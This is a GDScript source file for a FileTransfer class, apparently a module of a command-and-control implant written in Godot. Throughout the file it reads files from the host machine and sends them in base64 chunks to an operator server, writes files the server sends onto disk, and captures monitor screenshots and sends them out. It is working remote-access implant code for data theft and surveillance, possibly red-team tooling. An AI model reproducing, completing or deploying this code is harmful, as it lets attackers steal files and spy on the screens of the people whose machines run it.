extends Object

class_name FileTransfer

enum DIRECTION {UPLOAD, DOWNLOAD, SCREENSHOT}
enum STATUS {BEGIN, TRANSFER, COMPLETE, ERROR}

@export var state: STATUS = STATUS.BEGIN
const FileTransfer = preload("res://file_transfer.gd")
var api
var task_id
var file_id
var file_path
var direction
var position
var file_handle
var file_size = 0
var chunk_size = 8192 # bytes per response payload
var chunk_count = 0
var chunk_num = 1
var next_chunk_please = false
var data
var completed = false
var file_id_requested = false
var first_chunk_requested = false
var checkin_done = false

func debug():
	print("TaskID: %s\nFileId: %s\nFilePath: %s\n" % [task_id, file_id, file_path])

func _init(taskId, filePath, fileDirection, fileAPI, fileId = ""):
	task_id = taskId
	if filePath is String:
		file_path = filePath.simplify_path()
	else:
		file_path = filePath
	direction = fileDirection
	api = fileAPI
	file_id = fileId

func process():
	print("FileTransfer Process: ", file_path, "\n", task_id,  "\n",file_id,  "\n",file_id_requested,  "\n",next_chunk_please)

	if direction == DIRECTION.DOWNLOAD:
		process_download()
	
	if direction == DIRECTION.UPLOAD:
		process_upload()
	
	if direction == DIRECTION.SCREENSHOT:
		process_screenshot()

func process_upload():

	if not first_chunk_requested:
		first_chunk_requested = true

		completed = true

		file_size = 0

		print("\nUpload _process: ", file_path)

		# TODO: bail if we can't read the file and return this status / info

		file_handle = FileAccess.open(file_path , FileAccess.WRITE)

		if file_handle.is_open():
			file_path = file_handle.get_path_absolute()

			completed = false
			state = STATUS.BEGIN
		else:
			state = STATUS.ERROR

		api.send_agent_response(
			JSON.stringify({
				"action": "post_response",
				"responses": [{
					"upload": {
						"chunk_size": chunk_size,
						"file_id": file_id,
						"chunk_num": chunk_num,
						"full_path": file_path,
					},
					"task_id": task_id,
				}]
			})
		)

func process_upload_chunk(response):

	if response.get("status") and response.get("status") == "error":
		print("something went wrong...", response.get("error"))
		state = STATUS.ERROR
		completed = true
	else:
		if file_handle.is_open():
			state = STATUS.TRANSFER
			file_handle.store_buffer(Marshalls.base64_to_raw(response.get("chunk_data")))
			chunk_num += 1

			if response.get("total_chunks") <= response.get("chunk_num"): # TODO: better end state detection?
				completed = true
				state = STATUS.COMPLETE
				process_file_complete()
				return

			api.send_agent_response(
				JSON.stringify({
					"action": "post_response",
					"responses": [{
						"task_id": task_id,
						"upload": {
							"chunk_size": chunk_size,
							"file_id": file_id,
							"chunk_num": chunk_num,
							"full_path": file_path,
						}
					}]
				})
			)
		else:
			state = STATUS.ERROR
			pass # TODO: response with error state

func process_download():
	if not file_id_requested:
		var user_output = ""

		completed = true
		file_id_requested = true

		file_size = 0

		print("\nDownload _process: ", file_path)

		# TODO: bail if we can't read the file and return this status / info

		file_handle = FileAccess.open(file_path , FileAccess.READ)

		if file_handle.is_open():
			file_path = file_handle.get_path_absolute()
			file_size = file_handle.get_length()
			
			# one based chunk counting...   \-:
			var extra = 0
			
			if file_size % chunk_size > 0:
				extra = 1
			chunk_count = int(file_size / chunk_size) + extra
			user_output = "File size: %d\nFullpath: %s" % [file_size, file_path]

			state = STATUS.BEGIN
		else:
			state = STATUS.ERROR
			user_output = "Error code: %d\nFile: %s" % [file_handle.get_error(), file_path]

		api.send_agent_response(
			JSON.stringify({
				"action": "post_response", 
				"responses": [{
					"task_id": task_id,
					"user_output": user_output,
					"download": {
						"total_chunks": chunk_count,
						"full_path": file_path,
						"chunk_size": chunk_size
					}
				}]
			})
		)

	if next_chunk_please:
		state = STATUS.TRANSFER
		next_chunk_please = false

		if not file_handle.is_open():
			print("_process_download_chunk failed - file_handle for %s is closed..." % file_path)
			return

		position = file_handle.get_position()

		if position < file_size:
			completed = false

			chunk_num = int(position/chunk_size) + 1
			var next_chunk_size = chunk_size
			
			if chunk_num >= int(file_size / chunk_size) + 1:
				completed = true
				state = STATUS.COMPLETE

			if position + chunk_size > file_size:
				next_chunk_size = file_size - position

			api.send_agent_response(
				JSON.stringify(
					{
						"action": "post_response",
						"responses": [{
								"task_id": task_id,
								"download": {
									"chunk_num": chunk_num,
									"file_id": file_id,
									"chunk_data": Marshalls.raw_to_base64(file_handle.get_buffer(next_chunk_size)),
								}
							}
						]
					}
				)
			)

func process_file_complete():
	completed = true
	file_handle.close()
	state = STATUS.COMPLETE

	if direction == DIRECTION.DOWNLOAD or direction == DIRECTION.SCREENSHOT:
		api.send_agent_response(
			JSON.stringify(
				{
					"action": "post_response",
					"responses": [{
							"task_id": task_id,
							"status": "success",
							"completed": completed,
							"download": {
								"file_id": file_id,
							}
						}
					]
				}
			)
		)

	if direction == DIRECTION.UPLOAD:	
		api.send_agent_response(
			JSON.stringify(
				{
					"action": "post_response",
					"responses": [{
							"task_id": task_id,
							"status": "success",
							"completed": completed,
							"upload": {
								"file_id": file_id,
							}
						}
					]
				}
			)
		)

func process_download_chunk(fileId):

	if fileId:
		file_id = fileId

	next_chunk_please = true

func process_screenshot_chunk(fileId):

	if fileId:
		file_id = fileId

	next_chunk_please = true


func process_screenshot():

	if not file_id_requested:
		var user_output = ""

		completed = true
		file_id_requested = true

		file_size = 0
		position = 0

		print("\nScreenshot _process monitor: ", file_path)
		# TODO: bail if we can't read the file and return this status / info
		file_handle = DisplayServer.screen_get_image(file_path).save_png_to_buffer()
		file_path = "/screenshot/monitor_%s.png" % [file_path]

		if file_handle:
			file_size = file_handle.size()
			
			# one based chunk counting...   \-:
			var extra = 0
			
			if file_size % chunk_size > 0:
				extra = 1
			chunk_count = int(file_size / chunk_size) + extra
			user_output = "File size: %d\nFullpath: %s" % [file_size, file_path]

			state = STATUS.BEGIN
		else:
			state = STATUS.ERROR
			user_output = "Error code: %d\nFile: %s" % ["uh-oh", file_path]

		api.send_agent_response(
			JSON.stringify({
				"action": "post_response", 
				"responses": [{
					"task_id": task_id,
					"user_output": user_output,
					"download": {
						"total_chunks": chunk_count,
						"full_path": file_path,
						"chunk_size": chunk_size,
						"is_screenshot": true,
					}
				}]
			})
		)

	if next_chunk_please:
		state = STATUS.TRANSFER
		next_chunk_please = false

		if not file_handle:
			print("_process_screenshot_chunk failed - file_handle for %s is closed..." % file_path)
			return

		if position < file_size:
			completed = false

			chunk_num = int(position/chunk_size) + 1
			var next_chunk_size = chunk_size
			
			if chunk_num >= int(file_size / chunk_size) + 1:
				completed = true
				state = STATUS.COMPLETE

			if position + chunk_size > file_size:
				next_chunk_size = file_size - position
			
			var chunk = PackedByteArray(file_handle.slice(position, position+next_chunk_size))
			position = position+next_chunk_size

			api.send_agent_response(
				JSON.stringify(
					{
						"action": "post_response",
						"responses": [{
								"task_id": task_id,
								"download": {
									"chunk_num": chunk_num,
									"file_id": file_id,
									"chunk_data": Marshalls.raw_to_base64(chunk),
									"is_screenshot": true,
								}
							}
						]
					}
				)
			)
